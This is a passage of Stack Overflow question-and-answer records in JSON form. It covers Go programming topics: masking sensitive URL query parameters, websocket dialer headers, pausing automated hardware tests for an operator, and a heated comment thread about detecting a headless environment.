[]interface{}\n  for i := 1; i &lt;= value; i++{\n    interf = append(interf, i)\n  } \n  fmt.Println(interf)\n  for _,v := range interf{\n    if value == v{\n       fmt.Println(\"Matched\")\n    }\n  }\n}\n</code></pre>\n\n<p>How we do this same thing without using for loop</p>\n"}, {"tags": ["go", "automated-tests"], "comments": [{"owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "edited": false, "score": 0, "creation_date": 1540378192, "post_id": 52965107, "comment_id": 92840433, "body": "sorry your question isn&#39;t specific enough.  Voting to close as &quot;Too Broad&quot;"}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540393079, "post_id": 52965107, "comment_id": 92850648, "body": "The Go testing framework was intended for <i>testing a corresponding Go program</i>. This doesn&#39;t seem to be what you&#39;re doing. You should probably be writing a normal Go program, not a Go test suite. This is a classic square peg into round hole situation."}, {"owner": {"reputation": 158, "user_id": 10444937, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SXf4F.png?s=128&g=1", "display_name": "Prashanth", "link": "https://stackoverflow.com/users/10444937/prashanth"}, "edited": false, "score": 0, "creation_date": 1540448292, "post_id": 52965107, "comment_id": 92870907, "body": "Thank You . It is working fine if we just use it as a normal program."}], "owner": {"reputation": 158, "user_id": 10444937, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SXf4F.png?s=128&g=1", "display_name": "Prashanth", "link": "https://stackoverflow.com/users/10444937/prashanth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 46, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1540372192, "creation_date": 1540372192, "question_id": 52965107, "link": "https://stackoverflow.com/questions/52965107/how-do-i-intervene-in-middle-of-go-automation-testing-during-tests-execution", "title": "How do I intervene in middle of GO automation testing during tests execution?", "body": "<p>I am currently executing a series of tests on a Hardware device which gets input from the load in the form of Volts, Amperes.etc.\nI input various different parameters of load on the device before testing.It runs successfully and gives out a series of test results.</p>\n\n<p><a href=\"https://i.stack.imgur.com/GNhCp.png\" rel=\"nofollow noreferrer\">Output of the program</a></p>\n\n<p>These are the testing I employ</p>\n\n<ul>\n<li>ToleranceTest</li>\n<li>EqualsTest</li>\n<li>BooleanTest</li>\n<li>LookupIntTest</li>\n<li>LookupStrTest</li>\n<li>NotEqualsTest</li>\n</ul>\n\n<p><strong>I just want to know <em>refer:output image</em> that before running the next test can we have an operator intervention. For example, plugging and removing sensors</strong></p>\n\n<p>So the execute process needs to cater for this input</p>\n\n<p>Had tried to make provision in the json file - it may need some thinking as to whether it will work. \nThe json file is in this format</p>\n\n<pre><code>\"EXEC_HANDLE\": {\n    \"CLI\": {\n        \"ADDITIONAL_PARAMS\": \"\"\n    },\n    \"MAXLATENCY\": {\n        \"TITLE\": \"Ensure test performed is done within expected time frame (milliseconds)\",\n        \"TYPE\": \"Range\",\n        \"MAX\": \"220\",\n        \"MIN\": \"50\"\n    },\n    \"RESULTSET\": {\n        \"TITLE\": \"Result set from polling has expected quantity of records\",\n        \"TYPE\": \"Range\",\n        \"MAX\": 100,\n        \"MIN\": 5\n    }\n},\n\"TEST_REGIME\": [\n  {\n      \"TITLE\": \"L1 Amps Load\",\n      \"NAME\": \"L1_A\",\n      \"TYPE\": \"Tolerance\",\n      \"HAMEG_VALUE\": \"AMPS\",\n      \"TOLERANCE\": 0.5\n  }\n...\n...\n</code></pre>\n\n<p>Could be a transaction in the database we need to be recording the execution\nOr possible a touched file?</p>\n\n<p><strong>open to suggestions</strong></p>\n\n<p>I'd rather not be dependent on a database as I may want to execute tests outside of our test environment</p>\n\n<p><strong>Maybe the console is waiting for a key press from a user, but if a file is touched/removed, the process can continue non-interactively</strong></p>\n"}, {"tags": ["url", "go"], "comments": [{"owner": {"reputation": 3818, "user_id": 1247113, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zRMFj.png?s=128&g=1", "display_name": "rob74", "link": "https://stackoverflow.com/users/1247113/rob74"}, "edited": false, "score": 1, "creation_date": 1540372922, "post_id": 52964452, "comment_id": 92837148, "body": "What&#39;s the purpose of the masking? To avoid having sensitive data in logfiles (or similar)? In that case, a regexp search/replace might do the trick..."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540388824, "post_id": 52964452, "comment_id": 92847526, "body": "Why does it matter what order the parameters are in? A HTTP client is permitted to send parameters in any order, so preserving the order of an unordered list seems pointless."}, {"owner": {"reputation": 15926, "user_id": 474597, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/cf5fcf12effe4798f02aa84def25c684?s=128&d=identicon&r=PG", "display_name": "lulalala", "link": "https://stackoverflow.com/users/474597/lulalala"}, "edited": false, "score": 0, "creation_date": 1540428534, "post_id": 52964452, "comment_id": 92865997, "body": "Yes it is for logging purposes"}], "answers": [{"tags": [], "owner": {"reputation": 56, "user_id": 10527856, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-1W1BVBedIkY/AAAAAAAAAAI/AAAAAAAAA5E/WnagCOAgScE/photo.jpg?sz=128", "display_name": "Fran&#231;ois Bastien", "link": "https://stackoverflow.com/users/10527856/fran%c3%a7ois-bastien"}, "is_accepted": true, "score": 2, "last_activity_date": 1540373386, "creation_date": 1540373386, "answer_id": 52965552, "question_id": 52964452, "link": "https://stackoverflow.com/questions/52964452/mask-sensitive-url-query-params/52965552#52965552", "title": "Mask sensitive url query params", "body": "<p>First, the order of the params should not be of any importance.</p>\n\n<p>But I can see some situation where this rule does not apply (eg when you hash an URL). In this case, you should normalize the URL before using it.</p>\n\n<p>Finally to respond to your question, you cannot keep the order if using Query, as Values is a map, and map don't bother with ordering. You should thus work on the query using <code>u.RawQuery</code>.</p>\n\n<pre><code>u, err := url.Parse(originalURL)\nif err != nil {\n    panic(err)\n}\nnewQuery := \"\"\nfor i, queryPart := range strings.Split(u.RawQuery, \";\") {\n    // you now have a slice of string [\"private-token=foo\", \"authenticity_token=bar\"]\n    splitParam :=  strings.Split(queryPart, \"=\")\n    if toMask(splitParam[0]) {\n        splitParam[1] = \"FILTERED\"\n    }\n    if i != 0 {\n        newQuery = newQuery + \";\"\n    }\n    newQuery = splitParam[0] + \"=\" + splitParam[1]\n}\nu.RawQuery = newQuery\nreturn u.String()\n</code></pre>\n\n<p>This code is just example. You have to better check for special cases or errors. You can also use regexp if you want to.</p>\n"}], "owner": {"reputation": 15926, "user_id": 474597, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/cf5fcf12effe4798f02aa84def25c684?s=128&d=identicon&r=PG", "display_name": "lulalala", "link": "https://stackoverflow.com/users/474597/lulalala"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 278, "favorite_count": 0, "accepted_answer_id": 52965552, "answer_count": 1, "score": 0, "last_activity_date": 1540373386, "creation_date": 1540370300, "question_id": 52964452, "link": "https://stackoverflow.com/questions/52964452/mask-sensitive-url-query-params", "title": "Mask sensitive url query params", "body": "<p>Say I have this url</p>\n\n<pre><code>https://example.com:8080?private-token=foo&amp;authenticity_token=bar\n</code></pre>\n\n<p>And I have a function to determine whether to mask a param.</p>\n\n<p>How can I mask the url, but maintaining the order of params.</p>\n\n<p>Currently I have</p>\n\n<pre><code>u, err := url.Parse(originalURL)\nif err != nil {\n    panic(err)\n}\nm, _ := url.ParseQuery(u.RawQuery)\nfor key := range m {\n    if toMask(key) {\n        m.Set(key, \"FILTERED\")\n    }\n}\nu.RawQuery = m.Encode()\nreturn u.String()\n</code></pre>\n\n<p>But this would return url with the params being switched around.</p>\n\n<pre><code>https://example.com:8080?authenticity_token=FILTERED&amp;private-token=FILTERED\n</code></pre>\n"}, {"tags": ["go", "websocket"], "comments": [{"owner": {"reputation": 171, "user_id": 3406737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1994b6f607056621d02a7a5b71611fc?s=128&d=identicon&r=PG&f=1", "display_name": "horex", "link": "https://stackoverflow.com/users/3406737/horex"}, "edited": false, "score": 0, "creation_date": 1540375000, "post_id": 52964304, "comment_id": 92838497, "body": "You should answer to your own question and put your solution there. So that, it will be easier for someone with the same problem to find your solution."}, {"owner": {"reputation": 151, "user_id": 10527936, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10faded8ee52ba8dcdf52cd40204f52c?s=128&d=identicon&r=PG&f=1", "display_name": "faker", "link": "https://stackoverflow.com/users/10527936/faker"}, "reply_to_user": {"reputation": 171, "user_id": 3406737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1994b6f607056621d02a7a5b71611fc?s=128&d=identicon&r=PG&f=1", "display_name": "horex", "link": "https://stackoverflow.com/users/3406737/horex"}, "edited": false, "score": 0, "creation_date": 1540438741, "post_id": 52964304, "comment_id": 92868159, "body": "@horex, I did not enable this setting when I asked. I will pay attention to it later. thks"}], "answers": [{"tags": [], "owner": {"reputation": 151, "user_id": 10527936, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10faded8ee52ba8dcdf52cd40204f52c?s=128&d=identicon&r=PG&f=1", "display_name": "faker", "link": "https://stackoverflow.com/users/10527936/faker"}, "is_accepted": true, "score": 1, "last_activity_date": 1540438574, "creation_date": 1540438574, "answer_id": 52980972, "question_id": 52964304, "link": "https://stackoverflow.com/questions/52964304/websocket-set-protocol-and-origin/52980972#52980972", "title": "websocket set protocol and origin", "body": "<p>i found the solution, you can set like this</p>\n\n<pre><code>u := url.URL{Scheme: \"ws\", Host: url1}\nd := websocket.DefaultDialer\nd.Subprotocols = []string{protocol}\nheader := http.Header{}\nheader.Set(\"origin\", origin)\nc, _, err := d.Dial(u.String(), header)\n</code></pre>\n"}], "owner": {"reputation": 151, "user_id": 10527936, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10faded8ee52ba8dcdf52cd40204f52c?s=128&d=identicon&r=PG&f=1", "display_name": "faker", "link": "https://stackoverflow.com/users/10527936/faker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 541, "favorite_count": 1, "accepted_answer_id": 52980972, "answer_count": 1, "score": 1, "last_activity_date": 1540438574, "creation_date": 1540369833, "last_edit_date": 1540370243, "question_id": 52964304, "link": "https://stackoverflow.com/questions/52964304/websocket-set-protocol-and-origin", "title": "websocket set protocol and origin", "body": "<p>i use this lib: <a href=\"https://github.com/gorilla/websocket\" rel=\"nofollow noreferrer\">https://github.com/gorilla/websocket</a>\nhow to set protocol and origin,</p>\n\n<p>code :</p>\n\n<pre><code>func InitWSSClient(url1, protocol, origin string)  {\n    u := url.URL{Scheme: \"ws\", Host: url1}\n\n    fmt.Println(url1,u.String())\n    d :=websocket.DefaultDialer\n\n\n    //c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n    c, _, err :=d.Dial(u.String(),nil)\n    var limit int64 =1024 * 1024 *32\n\n    if err != nil {\n        log.Fatal(\"dial:\", err)\n    }\n    c.SetReadLimit(limit)\n\n    go readWSMessage(c)\n    go sendWSmessage(c)\n\n}\n\nfunc readWSMessage(ws *websocket.Conn) error {\n    for {\n        _,message,err := ws.ReadMessage()\n        if err != nil {\n            log15.Error(\"receiveWebsocket \", \"error\", err)\n            panic(\"error\")\n\n        }\n        assignmentWebsocket(string(message))\n    }\n}\n\nfunc sendWSmessage(ws *websocket.Conn) error {\n    for {\n\n        select {\n        case params := &lt;-WebsocketParams:\n            fmt.Println(\"ws send messages\", params)\n            err :=ws.WriteMessage(websocket.TextMessage,[]byte(params))\n            if err != nil {\n                log15.Error(\"receiveWebsocket \", \"error\", err)\n                panic(\"error\")\n\n            }\n        }\n\n    }\n\n}\n</code></pre>\n\n<p>x.net.websocket  set these element like this :</p>\n\n<pre><code>websocket.Dial(url, protocol, origin)\n</code></pre>\n\n<p>how to achieve this function in gorilla/websocket/, ths you help.\ni try many solutions is not working. if you know any solutions, </p>\n\n<p>found the solution:</p>\n\n<pre><code>d := websocket.DefaultDialer\nd.Subprotocols = []string{protocol}\nheader :=http.Header{}\nheader.Set(\"origin\",origin)\n</code></pre>\n"}, {"tags": ["go", "headless"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540389084, "post_id": 52964022, "comment_id": 92847733, "body": "This <i>might</i> be possible, but would be incredibly difficult and offer little value. To determine if a machine is &quot;headless&quot; (i.e. with no attached display) would require querying the attached devices, which would require platform-specific system calls for every supported OS, and elevated privileges."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "reply_to_user": {"reputation": 60130, "user_id": 13860, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6bdc06836b7bcec9fce2c5c6e5242192?s=128&d=identicon&r=PG", "display_name": "Flimzy", "link": "https://stackoverflow.com/users/13860/flimzy"}, "edited": false, "score": 0, "creation_date": 1540389761, "post_id": 52964022, "comment_id": 92848249, "body": "@Flimzy I define &quot;headless&quot; as the environment being unable or justifiedly unwilling to provide the capability for a graphical user interface for the process. For example, Java has an API call <code>java.awt.GraphicsEnvironment.isHeadless()</code> for that purpose."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540395092, "post_id": 52964022, "comment_id": 92852038, "body": "@Adrian Indeed it would require platform-specific code, but I doubt whether it would require elevated privileges. For systems on which the presence of an X server can be assumed for headed systems, such as BSD, Darwin, and Linux, the check of the <code>DISPLAY</code> environment variable probably is sufficient. Java provides an <code>isHeadless()</code> function, and it operates just fine without elevated privileges."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540395441, "post_id": 52964022, "comment_id": 92852238, "body": "The presence of an X server is orthogonal to operating headless. An X server can run on a headless machine for the purpose of allowing GUI remote access."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540395877, "post_id": 52964022, "comment_id": 92852528, "body": "@Adrian If an X server is running, for example, in the form of Xvnc, and accessible by the process, the environment is headed. What exactly is all this arguing about? Headed / Headless are set and clear terms, in Java, CI/CD, Selenium, nobody is confused about that, what&#39;s going on here?"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540396751, "post_id": 52964022, "comment_id": 92853113, "body": "You seem to be confused about these terms. A headless machine is one <i>without an attached display</i>, regardless of whether X is running. The &quot;head&quot; is the display, not the GUI software. See, for example, the definition here: <a href=\"https://en.wikipedia.org/wiki/Headless_computer\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Headless_computer</a>: &quot;One can also use systems such as X Window System and VNC combined with virtual display drivers - this setup allows remote connections to headless machines through ordinary graphical user interfaces, often running over network protocols like TCP/IP.&quot; or here: <a href=\"https://whatis.techtarget.com/definition/headless-server\" rel=\"nofollow noreferrer\">whatis.techtarget.com/definition/headless-server</a>"}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540397173, "post_id": 52964022, "comment_id": 92853395, "body": "@Adrian Uhm, where am I talking about a headless machine? I&#39;m not confused about anything. I&#39;m interested whether the process is headless. Whether the machine is headless is irrelevant for displaying a tray icon. I think you must have misread &quot;headed&quot; as &quot;headless&quot; in my previous comment. I want to know whether the App can create a GUI, and I&#39;m never talking of whether a monitor is attached or not, that&#39;s irrelevant for being headless from a software perspective, because of what exactly you describe, remote access. I don&#39;t care whether access was local or remote."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540397860, "post_id": 52964022, "comment_id": 92853793, "body": "The title of your question is &quot;How to detect if the current Go process is running in a headless environment?&quot;. Perhaps you could rephrase the question in terms of whether there is a GUI available rather than whether it is running headless, because headless is a hardware concept which seems to be irrelevant to your needs based on your comments."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540398184, "post_id": 52964022, "comment_id": 92853967, "body": "@Adrian headless is not a hardware concept. Headless machine is a hardware concept. The term headless itself is a much broader term. There also is headless software <a href=\"https://en.wikipedia.org/wiki/Headless_software\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Headless_software</a>. And headless testing with Selenium/Webdriver. Whether <code>java.awt.GraphicsEnvironment.isHeadless()</code> returns <code>true</code> or <code>false</code> is a software question, not a hardware question. On Linux and Solaris, <code>java.awt.GraphicsEnvironment.isHeadless()</code> returns <code>true</code> exactly if <code>DISPLAY</code> is set and non-empty. And I wouldn&#39;t claim that Java has a misnomer in its API, not in this instance."}, {"owner": {"reputation": 60130, "user_id": 13860, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6bdc06836b7bcec9fce2c5c6e5242192?s=128&d=identicon&r=PG", "display_name": "Flimzy", "link": "https://stackoverflow.com/users/13860/flimzy"}, "edited": false, "score": 0, "creation_date": 1540413100, "post_id": 52964022, "comment_id": 92861430, "body": "@ChristianHujer: Your definition is problematic, because it includes motivation. It&#39;s impossible, programatically, to determine if a machine is &quot;justified&quot; in not providing a GUI."}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540416793, "post_id": 52964022, "comment_id": 92862927, "body": "You should report this as an issue to the getlantern/systray authors. They could make a trivial change to cause Run() to return an error instead of exiting. In particular they need to call gtk_init_check() instead of gtk_init() and return an error if it fails."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "reply_to_user": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540452509, "post_id": 52964022, "comment_id": 92873022, "body": "@MichaelHampton I already did that."}, {"owner": {"reputation": 60130, "user_id": 13860, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6bdc06836b7bcec9fce2c5c6e5242192?s=128&d=identicon&r=PG", "display_name": "Flimzy", "link": "https://stackoverflow.com/users/13860/flimzy"}, "edited": false, "score": 0, "creation_date": 1540453300, "post_id": 52964022, "comment_id": 92873455, "body": "No, I&#39;m not imposing anything. I&#39;m conforming your title to match your explained desires. You are, of course, free to revert helpful edits, though. But it won&#39;t help you get better answers."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "edited": false, "score": 0, "creation_date": 1540453880, "post_id": 52964022, "comment_id": 92873840, "body": "I give up. I even wanted to delete this question, but StackOverflow doesn&#39;t let me. I find the reaction to Go questions on StackOverflow a very unpleasant experience. I haven&#39;t experienced such unpleasentness and arrogance (&quot;I know better what headless means than you, and I don&#39;t care how Sun, Oracle, Java and others define headless&quot; - you didn&#39;t say that, but that&#39;s your attitude) anywhere else on StackOverflow. I retreat. I give up. I will not ask Go questions again on StackOverflow."}, {"owner": {"reputation": 60130, "user_id": 13860, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6bdc06836b7bcec9fce2c5c6e5242192?s=128&d=identicon&r=PG", "display_name": "Flimzy", "link": "https://stackoverflow.com/users/13860/flimzy"}, "edited": false, "score": 0, "creation_date": 1540454831, "post_id": 52964022, "comment_id": 92874341, "body": "The problem with &quot;headless&quot; is it has multiple, conflicting meanings. It can mean hardware with no monitor attached, it can mean a process with no console attached (typical Unix definition)--it can mean a process or OS with no GUI capabilities (seems to be roughly what you&#39;re talking about). My edit was to clarify your question. The fact that you &quot;disagree&quot; with that is, from my perspective, absurd. What is there to disagree with? Do you disagree that &quot;headless&quot; is ambiguous? Maybe you disagree with <i>how</i> I interpreted the rest of your question (non-GUI)?"}, {"owner": {"reputation": 60130, "user_id": 13860, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6bdc06836b7bcec9fce2c5c6e5242192?s=128&d=identicon&r=PG", "display_name": "Flimzy", "link": "https://stackoverflow.com/users/13860/flimzy"}, "edited": false, "score": 1, "creation_date": 1540454910, "post_id": 52964022, "comment_id": 92874389, "body": "Nobody said they know better than you what headless means.  We simply asked <i>what do you mean</i>?  And you gave an answer. That answer seems reasonable. What&#39;s not reasonable is refusing clarifying edits to your question."}, {"owner": {"reputation": 60130, "user_id": 13860, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6bdc06836b7bcec9fce2c5c6e5242192?s=128&d=identicon&r=PG", "display_name": "Flimzy", "link": "https://stackoverflow.com/users/13860/flimzy"}, "edited": false, "score": 0, "creation_date": 1540454999, "post_id": 52964022, "comment_id": 92874433, "body": "There&#39;s no reason to &quot;give up&quot;.  The Go community is a bit special in some ways (not just on SO). But then so is every other programming community. The fact that Go is still relatively new probably means it&#39;s also more likely to be comprised of early adopters, and other high-motivation, highly-technical people. That will be progressively less true over time.  But the problem with <i>this question</i> has exactly nothing to do with Go."}], "answers": [{"comments": [{"owner": {"reputation": 42799, "user_id": 720999, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/04ee78e90161fa1c4dce14d615315160?s=128&d=identicon&r=PG", "display_name": "kostix", "link": "https://stackoverflow.com/users/720999/kostix"}, "edited": false, "score": 0, "creation_date": 1540376948, "post_id": 52966593, "comment_id": 92839659, "body": "BTW, Christian, could you shed a bit more light for me on how do you define a headless Windows machine? I thought that there any non-service application has access to <i>some</i> desktop session anyway (I mean, even on &quot;core&quot; Server flavors). Am I wrong?"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540388932, "post_id": 52966593, "comment_id": 92847606, "body": "Indeed even what one would call a headless Windows machine (one with no display attached) still runs a GUI accessible by RDP."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "edited": false, "score": 1, "creation_date": 1540390743, "post_id": 52966593, "comment_id": 92848953, "body": "@kostix see for example Windows 10 IoT Core <a href=\"https://docs.microsoft.com/en-us/windows/iot-core/learn-about-hardware/headlessmode\" rel=\"nofollow noreferrer\">docs.microsoft.com/en-us/windows/iot-core/learn-about-hardwa&zwnj;&#8203;re/&hellip;</a> There is such a thing as headless Windows, officially."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "edited": false, "score": 0, "creation_date": 1540393387, "post_id": 52966593, "comment_id": 92850852, "body": "@kostix Please clarify why you think that would be rather futile. Java even provides an API call for that, <code>java.awt.GraphicsEnvironment.isHeadless()</code>."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "edited": false, "score": 0, "creation_date": 1540396238, "post_id": 52966593, "comment_id": 92852763, "body": "@kostix Also please note that I&#39;m not interested in knowing whether the machine is headless. If headless machine or headless hardware is mentioned anywhere in my question, please point it out and I&#39;ll fix it. I&#39;m interested whether the process is running in a headless environment. On X, if <code>DISPLAY</code> is set, it&#39;s headed (although might be misconfigured), if <code>DISPLAY</code> is unset, it&#39;s headless. Where that X is running, via <code>ssh -X</code> / <code>ssh -Y</code>, or Xvnc, or whatever, plays no role for being headed."}, {"owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "edited": false, "score": 0, "creation_date": 1540396349, "post_id": 52966593, "comment_id": 92852833, "body": "@kostix However, I think my question title might have left doubts about that. I hope I fixed that now."}], "tags": [], "owner": {"reputation": 42799, "user_id": 720999, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/04ee78e90161fa1c4dce14d615315160?s=128&d=identicon&r=PG", "display_name": "kostix", "link": "https://stackoverflow.com/users/720999/kostix"}, "is_accepted": false, "score": 3, "last_activity_date": 1540376668, "creation_date": 1540376668, "answer_id": 52966593, "question_id": 52964022, "link": "https://stackoverflow.com/questions/52964022/how-to-detect-if-the-current-go-process-is-running-in-a-headless-non-gui-envir/52966593#52966593", "title": "How to detect if the current Go process is running in a headless (non-GUI) environment?", "body": "<p>I think you might be attacking this problem from a wrong angle.</p>\n\n<p>Detecting <em>reliably</em> that your program really sees a headless machine is, IMO, rather futile for a number of reasons.</p>\n\n<p>Hence I think I'd adopt an approach usually sported in, say, working with filesystems:</p>\n\n<ol>\n<li>Try to perform an operation.</li>\n<li>If it fails, collect the error.</li>\n<li>Analyze the error and act accordingly.</li>\n</ol>\n\n<p>That is, just try to explicitly initialize the client (yours) side of whatever works with the GUI stack in your code, trap any possible error and analyze it. If it says it failed to initialize the subsystem, then just raise a relevant flag and proceed.</p>\n"}, {"tags": [], "owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "is_accepted": true, "score": 0, "last_activity_date": 1540464933, "last_edit_date": 1540464933, "creation_date": 1540464141, "answer_id": 52987351, "question_id": 52964022, "link": 